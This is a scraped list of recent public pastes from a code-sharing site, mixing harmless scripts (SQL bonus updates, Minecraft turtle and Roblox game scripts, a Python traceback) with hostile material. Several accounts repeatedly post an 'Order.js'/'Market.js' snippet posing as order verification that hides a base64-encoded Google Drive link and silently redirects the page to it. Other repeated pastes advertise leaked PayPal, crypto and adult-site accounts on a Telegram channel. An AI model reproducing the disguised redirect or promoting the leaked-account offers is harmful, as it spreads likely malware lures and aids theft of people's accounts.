INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1795307, NOW(), 100, '+100 золотых бонусов - з/п МД Adegbuyi за апрель'); 


-- Техническая поддержка

UPDATE `bonus` SET `gold`=gold+1000 WHERE `id`='456853'; -- Seanone
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (456853, NOW(), 1000, '+1000 золотых бонусов - з/п тех.поддержки Seanone за апрель'); 


-- QA Team

UPDATE `bonus` SET `gold`=gold+1000 WHERE `id`='211220'; -- nastyasia
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (211220, NOW(), 1000, '+1000 золотых бонусов - з/п QA-тестер nastyasia за апрель'); 

UPDATE `bonus` SET `gold`=gold+800 WHERE `id`='1609205'; -- love_love
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1609205, NOW(), 800, '+800 золотых бонусов - з/п QA-тестер Love_love за апрель'); 
"
4rNrG1EX,Order.js,hubertzoo90,JavaScript,Thursday 1st of May 2025 05:03:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14572/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FK6SikfX,Crypto Accounts,x2LeaF,JavaScript,Thursday 1st of May 2025 05:03:23 AM CDT,92608 Accounts Posted On https://t.me/leakzbyeminem
F5DStAJg,Market.js,hubertzoo90,JavaScript,Thursday 1st of May 2025 04:48:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55187/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
apHqBFs5,PayPal with Balance,x2LeaF,JavaScript,Thursday 1st of May 2025 04:47:55 AM CDT,06572 Accounts Posted On https://t.me/leakzbyeminem
uAjCE3sH,Untitled,hubertzoo90,JavaScript,Thursday 1st of May 2025 04:32:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45796/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FxtHKx9n,PayPal with Balance,hubertzoo90,JavaScript,Thursday 1st of May 2025 04:32:31 AM CDT,80908 Accounts Posted On https://t.me/leakzbyeminem
hMVme4Gr,Luz v6,vacnoa,Lua,Thursday 1st of May 2025 04:24:44 AM CDT,"-- Configuración
local ENV_SIDE = ""left""
local LIGHT_THRESHOLD = 5
local FUEL_MINIMUM = 400
local recorrido = {}  -- Para registrar el camino recorrido

-- Variables de visualización
local posicion = {x = 0, y = 0, z = 0}
local direccion = 0  -- 0: norte, 1: este, 2: sur, 3: oeste
local TGiro = ""right""  -- Dirección inicial del zigzag

-- Movimiento con registro para poder volver
local function avanzarRegistrando()
  if turtle.forward() then
    table.insert(recorrido, ""back"")
    if direccion == 0 then posicion.z = posicion.z - 1
    elseif direccion == 1 then posicion.x = posicion.x + 1
    elseif direccion == 2 then posicion.z = posicion.z + 1
    elseif direccion == 3 then posicion.x = posicion.x - 1 end
    return true
  end
  return false
end

local function subirRegistrando()
  if turtle.up() then
    table.insert(recorrido, ""down"")
    posicion.y = posicion.y + 1
    return true
  end
  return false
end

local function bajarRegistrando()
  if turtle.down() then
    table.insert(recorrido, ""up"")
    posicion.y = posicion.y - 1
    return true
  end
  return false
end

local function girarDerecha()
  turtle.turnRight()
  direccion = (direccion + 1) % 4
  table.insert(recorrido, ""turnLeft"")
end

local function girarIzquierda()
  turtle.turnLeft()
  direccion = (direccion - 1) % 4
  if direccion < 0 then direccion = direccion + 4 end
  table.insert(recorrido, ""turnRight"")
end

-- Volver al inicio usando el recorrido almacenado
local function volverAlInicio()
  print(""Volviendo al inicio..."")
  for i = #recorrido, 1, -1 do
    local accion = recorrido[i]
    if accion == ""back"" then
      turtle.back()
    elseif accion == ""up"" then
      turtle.up()
    elseif accion == ""down"" then
      turtle.down()
    elseif accion == ""turnLeft"" then
      turtle.turnLeft()
    elseif accion == ""turnRight"" then
      turtle.turnRight()
    end
    sleep(0.1)
  end
  print(""Regresó al inicio."")
end

-- Repostaje si es necesario
local function refuelIfNeeded()
  if turtle.getFuelLevel() == ""unlimited"" then return end
  if turtle.getFuelLevel() < FUEL_MINIMUM then
    print(""Combustible bajo. Intentando repostar desde el slot 16..."")
    turtle.select(16)
    if turtle.refuel() then
      print(""Repostaje exitoso. Nivel actual:"", turtle.getFuelLevel())
    else
      print(""No se pudo repostar. Sin combustible."")
    end
  end
end

-- Obtener nivel de luz en el bloque actual
local function isDarkHere()
  local light = peripheral.call(ENV_SIDE, ""getBlockLightLevel"")
  print(""Nivel de luz:"", light)
  return light < LIGHT_THRESHOLD
end

-- Colocar una antorcha en el bloque actual
local function placeTorchHere()
  for i = 1, 15 do
    local item = turtle.getItemDetail(i)
    if item and item.name == ""minecraft:torch"" then
      turtle.select(i)
      if subirRegistrando() then
        if turtle.placeDown() then
          print(""Antorcha colocada."")
          bajarRegistrando()
          return true
        else
          print(""No se pudo colocar la antorcha."")
          bajarRegistrando()
          return false
        end
      else
        print(""No se pudo subir para colocar la antorcha."")
        return false
      end
    end
  end
  print(""No hay antorchas disponibles."")
  return false
end

-- Intentar subir un escalón si hay obstáculo
local function subirescalon()
  if turtle.detect() then
    if not subirRegistrando() then
      return false
    end
  end
  return true
end

-- Cambio de carril con zigzag
local function cambiocarril()
  print(""Cambiando de carril..."")
  while not turtle.detectDown() and bajarRegistrando() do end

  if TGiro == ""left"" then
    girarIzquierda()
  else
    girarDerecha()
  end

  local pasosExitosos = 0
  for paso = 1, 4 do
    if subirescalon() and avanzarRegistrando() then
      pasosExitosos = pasosExitosos + 1
      while not turtle.detectDown() and bajarRegistrando() do end
    else
      while not turtle.detectDown() and bajarRegistrando() do end
      local ret = true
      local retrocedi = false
      local retrocedo = false

      if TGiro == ""left"" then
        girarIzquierda()
      else
        girarDerecha()
      end

      while not retrocedo do
        if subirescalon() and avanzarRegistrando() and ret then
          if not retrocedi then
            if TGiro ~= ""left"" then
              girarIzquierda()
            else
              girarDerecha()
            end
            retrocedi = true
            retrocedo = true
          end
        else
          if TGiro ~= ""left"" then
            girarIzquierda()
          else
            girarDerecha()
          end
          turtle.back()
          table.insert(recorrido, ""turnLeft"")
          table.insert(recorrido, ""turnLeft"")
          table.insert(recorrido, ""back"")
          table.insert(recorrido, ""turnLeft"")
          table.insert(recorrido, ""turnLeft"")
          pasosExitosos = pasosExitosos - 1
          retrocedo = true
          ret = false
        end
      end
    end
  end

  -- Cambiar dirección del siguiente zigzag
  TGiro = (TGiro == ""left"") and ""right"" or ""left""

  if TGiro == ""left"" then
    girarIzquierda()
  else
    girarDerecha()
  end

  if turtle.detect() then
    if TGiro == ""left"" then
      girarIzquierda()
    else
      girarDerecha()
    end
    print(""Obstáculo en nuevo carril. Cambiando dirección."")
  end

  return true
end

-- Mostrar estado actual
local function printEstado()
  local dirStr = ({[0] = ""Norte"", [1] = ""Este"", [2] = ""Sur"", [3] = ""Oeste""})[direccion]
  print(string.format(""[POS] X:%d Y:%d Z:%d | Dir: %s"", posicion.x, posicion.y, posicion.z, dirStr))
end

-- Exploración principal
local function explore()
  while true do
    refuelIfNeeded()

    if isDarkHere() and turtle.detectDown() then
      placeTorchHere()
    end

    if turtle.detect() then
      print(""Obstáculo delante. Intentando subir..."")
      local step = 0
      local toping = false
      while step < 3 do
        if subirRegistrando() then
          step = step + 1
          if avanzarRegistrando() then
            toping = true
            while not turtle.detectDown() and bajarRegistrando() do end
            break
          end
        else
          break
        end
      end
      if not toping then
        if not cambiocarril() then
          print(""Fin del camino. No se puede avanzar."")
          volverAlInicio()
          return
        end
      end
    else
      if avanzarRegistrando() then
        while not turtle.detectDown() and bajarRegistrando() do end
      else
        print(""No se pudo avanzar ni rodear."")
        if not cambiocarril() then
          volverAlInicio()
          return
        end
      end
    end
    printEstado()
    sleep(0.2)
  end
end

-- Verificar environmentDetector
if not peripheral.isPresent(ENV_SIDE) or peripheral.getType(ENV_SIDE) ~= ""environmentDetector"" then
  error(""No se encontró un environmentDetector en el lado: "" .. ENV_SIDE)
end

-- Iniciar exploración
explore()
"
f9aLYZ5U,Untitled,jm33,JavaScript,Thursday 1st of May 2025 04:17:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97675/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EkwTk2fE,Chaturbate with Tokens,jm33,JavaScript,Thursday 1st of May 2025 04:17:05 AM CDT,82901 Accounts Posted On https://t.me/leakzbyeminem
B430VRPB,Roblox Wallhop Script,Steamhesaproblox,RBScript,Thursday 1st of May 2025 04:06:17 AM CDT,"local screenGui = Instance.new(""ScreenGui"")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"")
screenGui.ResetOnSpawn = false

local frame = Instance.new(""Frame"")
frame.Parent = screenGui
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.Size = UDim2.new(0, 200, 0, 100)
frame.Position = UDim2.new(0.5, -100, 0.5, -50)
frame.Active = true
frame.Draggable = true

local onButton = Instance.new(""TextButton"")
onButton.Parent = frame
onButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
onButton.Size = UDim2.new(0, 60, 0, 30)
onButton.Position = UDim2.new(0, 20, 0, 20)
onButton.Text = ""On""
onButton.TextScaled = true

local offButton = Instance.new(""TextButton"")
offButton.Parent = frame
offButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
offButton.Size = UDim2.new(0, 60, 0, 30)
offButton.Position = UDim2.new(0, 120, 0, 20)
offButton.Text = ""Off""
offButton.TextScaled = true

local destroyButton = Instance.new(""TextButton"")
destroyButton.Parent = frame
destroyButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
destroyButton.Size = UDim2.new(0, 160, 0, 30)
destroyButton.Position = UDim2.new(0, 20, 0, 60)
destroyButton.Text = ""Destroy""
destroyButton.TextScaled = true

local statusLabel = Instance.new(""TextLabel"")
statusLabel.Parent = frame
statusLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
statusLabel.Size = UDim2.new(0, 200, 0, 30)
statusLabel.Position = UDim2.new(0, 0, 0, -30)
statusLabel.Text = ""WallHop V2: Off""
statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
statusLabel.TextScaled = true

local toggle = false
local InfiniteJumpEnabled = true
local UserInputService = game:GetService(""UserInputService"")
local Players = game:GetService(""Players"")
local Workspace = game:GetService(""Workspace"")
local RunService = game:GetService(""RunService"")

local raycastParams = RaycastParams.new()
raycastParams.FilterType = Enum.RaycastFilterType.Blacklist

local function getWallRaycastResult()
    local player = Players.LocalPlayer
    local character = player.Character
    if not character then return nil end
    local humanoidRootPart = character:FindFirstChild(""HumanoidRootPart"")
    if not humanoidRootPart then return nil end

    raycastParams.FilterDescendantsInstances = {character}

    local directions = {
        humanoidRootPart.CFrame.LookVector,
        -humanoidRootPart.CFrame.LookVector,
        humanoidRootPart.CFrame.RightVector,
        -humanoidRootPart.CFrame.RightVector
    }
    local detectionDistance = 2
    local closestHit = nil
    local minDistance = detectionDistance + 1

    for _, direction in pairs(directions) do
        local ray = Workspace:Raycast(
            humanoidRootPart.Position,
            direction * detectionDistance,
            raycastParams
        )
        if ray and ray.Instance then
             if ray.Distance < minDistance then
                 minDistance = ray.Distance
                 closestHit = ray
             end
        end
    end
    return closestHit
end

onButton.MouseButton1Click:Connect(function()
    statusLabel.Text = ""WallHop V2: On""
    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
    toggle = true
end)

offButton.MouseButton1Click:Connect(function()
    statusLabel.Text = ""WallHop V2: Off""
    statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    toggle = false
end)

destroyButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

UserInputService.JumpRequest:Connect(function()
    if not toggle or not InfiniteJumpEnabled then return end

    local player = Players.LocalPlayer
    local character = player.Character
    local humanoid = character and character:FindFirstChildOfClass(""Humanoid"")
    local rootPart = character and character:FindFirstChild(""HumanoidRootPart"")
    local camera = Workspace.CurrentCamera

    if not (humanoid and rootPart and camera) then return end

    local wallRayResult = getWallRaycastResult()

    if wallRayResult then
        InfiniteJumpEnabled = false

        local wallNormal = wallRayResult.Normal
        local horizontalWallNormal = Vector3.new(wallNormal.X, 0, wallNormal.Z).Unit
        if horizontalWallNormal.Magnitude < 0.1 then
             horizontalWallNormal = (rootPart.CFrame.LookVector * Vector3.new(1,0,1)).Unit
             if horizontalWallNormal.Magnitude < 0.1 then horizontalWallNormal = Vector3.new(0,0,-1) end
        end
        local baseDirectionAwayFromWall = horizontalWallNormal

        local cameraLook = camera.CFrame.LookVector
        local horizontalCameraLook = Vector3.new(cameraLook.X, 0, cameraLook.Z).Unit
        if horizontalCameraLook.Magnitude < 0.1 then horizontalCameraLook = baseDirectionAwayFromWall end

        local maxInfluenceAngle = math.rad(40)
        local dot = math.clamp(baseDirectionAwayFromWall:Dot(horizontalCameraLook), -1, 1)
        local angleBetween = math.acos(dot)
        local cross = baseDirectionAwayFromWall:Cross(horizontalCameraLook)
        local rotationSign = math.sign(cross.Y)
        if rotationSign == 0 then angleBetween = 0 end
        local actualInfluenceAngle = math.min(angleBetween, maxInfluenceAngle)
        local adjustmentRotation = CFrame.Angles(0, actualInfluenceAngle * rotationSign, 0)
        local initialTargetLookDirection = adjustmentRotation * baseDirectionAwayFromWall

        rootPart.CFrame = CFrame.lookAt(rootPart.Position, rootPart.Position + initialTargetLookDirection)

        RunService.Heartbeat:Wait()

        local didJump = false
        if humanoid and humanoid:GetState() ~= Enum.HumanoidStateType.Dead then
             humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
             didJump = true
        end

        if didJump then
             local directionTowardsWall = -baseDirectionAwayFromWall
             rootPart.CFrame = CFrame.lookAt(rootPart.Position, rootPart.Position + directionTowardsWall)
        end

        task.wait(0.15)
        InfiniteJumpEnabled = true
    end
end)
"
Uh3sQKZH,Order.js,zebmekey,JavaScript,Thursday 1st of May 2025 04:01:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/62127/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8x7HNLd1,Crypto Accounts,jm33,JavaScript,Thursday 1st of May 2025 04:01:43 AM CDT,24505 Accounts Posted On https://t.me/leakzbyeminem
k2cHNd6s,Untitled,artemsemkin,JavaScript,Thursday 1st of May 2025 03:59:02 AM CDT,"document.addEventListener('DOMContentLoaded', () => {
  const ZL = new ZLPlayer();
  ZL.loadZLGalleryFromJson(""https://us.zoomlook.cloud/zl/galleries/wZtsAR-687916/config/config.json"", ""ZLView"");
});"
8W6rxDsj,Market.js,zebmekey,JavaScript,Thursday 1st of May 2025 03:46:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26004/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
V9dNLQqT,PayPal with Balance,jm33,JavaScript,Thursday 1st of May 2025 03:46:20 AM CDT,75173 Accounts Posted On https://t.me/leakzbyeminem
pvRL6HPw,AttributeError: 'NoneType' object has no attribute 'name',basedcount_bot,Python,Thursday 1st of May 2025 03:41:42 AM CDT,"Traceback (most recent call last):
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 275, in read_comments
    parent_info = await get_parent_info(comment)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 237, in get_parent_info
    parent_author = parent_post.author.name
                    ^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'name'
"
S67j7heg,self replicating turtles test,acool,Lua,Thursday 1st of May 2025 03:34:54 AM CDT,"-- IMPLEMENTED LATER
local maxDistance = 100 -- the amount of blocks the turtle can move away from its first position X,Y not 
-- pastebin get S67j7heg colony
-- use maxDistance if you wanna limit turtle to only move in a certain area
local position = {0,0,0} -- X is forward based on turtles original orientation
local orientation = 1 -- forward,right,backward,left

local currentItemDetail = {name=""hello"",count=1}
local currentFuel = 0
local desiredFuel = 800
-- 1 coal = 80 fuel 
-- 1 fuel = 1 move block
function turnRight() 
    turtle.turnRight()
   orientation=orientation+1
    if orientation >4 then orientation = 1 end
end

function turnLeft() 
    turtle.turnLeft()
   orientation=orientation-1
    if orientation <1 then orientation = 4 end
end
function turn(direction)
   while orientation~=direction do turnRight() end 
end
function getFromChest(name)
    turtle.drop()
    local adsa,asdasd = turtle.suck()
    repeat      
        adsa,asdasd = turtle.suck()
        currentItemDetail = turtle.getItemDetail()
        if currentItemDetail and currentItemDetail.name==name then
            return
        else 
           turtle.dropUp() 
        end
    until adsa==false
   	repeat      
        adsa,asdasd = turtle.suckUp()
        turtle.drop()
    until adsa==false
    
end
function forward()
	turtle.select(4)
    turtle.dig(""right"")
    turtle.dropDown()
    turtle.forward()
   if orientation==1 then
       	 position[1]=position[1]+1
   elseif orientation==2 then
   		position[3]=position[3]+1
   elseif orientation==3 then
        position[1]=position[1]-1
   elseif orientation==4 then
        position[3]=position[3]-1
   end
    turtle.select(1)
end
function dropAll()
   for i=1,16 do
      turtle.select(i)
       turtle.drop()
   end
    turtle.select(1)
end
function digMove(direction)
   if direction==""up"" then
        turtle.digUp()
        turtle.up()
	   position[2]=position[2]+1
   elseif direction==""down"" then
   		turtle.digDown()
        turtle.down()
		position[2]=position[2]-1
   else 
      turn(direction)
        turtle.dig(""right"")
        forward()
   end
end
print(""Turtle Self-replication"")
print(""Please insert 10 coal into slot"")
turtle.turnRight()
-- wait for user to input fuel
while currentFuel < desiredFuel do
    turtle.refuel(desiredFuel/80)
    currentFuel = turtle.getFuelLevel()
    print(""Fuel : ""..currentFuel.."" / ""..desiredFuel)
    sleep(1) 
end
print(""done insert fuel, remove any items in slot"")
-- walk forward to disperse
for i=1,5 do
    forward()
    sleep(0)
    position={0,0,0}
end

-- get a chest for craft organization
print(""Need a chest in selected slot ONLY 1"")
repeat
    currentItemDetail = turtle.getItemDetail() 
    sleep(1)
until currentItemDetail and currentItemDetail.name == ""minecraft:chest"" and currentItemDetail.count == 1

print(""Setting up base... Digging down 8 blocks to make furnace.. make sure to check that below block is stone"")
turtle.place() -- place chest
sleep(1)
-- dig until 8 cobblestone
repeat
	digMove(""down"")
	currentItemDetail = turtle.getItemDetail() 
until currentItemDetail.name == ""minecraft:cobblestone"" and currentItemDetail.count >= 8
-- go back to base
repeat
       turtle.up()
	   position[2]=position[2]+1
until position[2]==0
-- drop all into chest
dropAll()
turtle.select(16)
dropAll()
getFromChest(""minecraft:cobblestone"")
turtle.transferTo(1,1)
turtle.transferTo(2,1)
turtle.transferTo(3,1)
turtle.transferTo(5,1)
turtle.transferTo(7,1)
turtle.transferTo(9,1)
turtle.transferTo(10,1)
turtle.transferTo(11,1)
turtle.drop()
turtle.craft(1)
turtle.select(1)
turtle.placeUp()"
dmgWvU4G,Untitled,zebmekey,JavaScript,Thursday 1st of May 2025 03:31:04 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20855/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nUVkPTpB,Leaked Accounts - Fresh Hits,jm33,JavaScript,Thursday 1st of May 2025 03:30:57 AM CDT,43845 Accounts Posted On https://t.me/leakzbyeminem
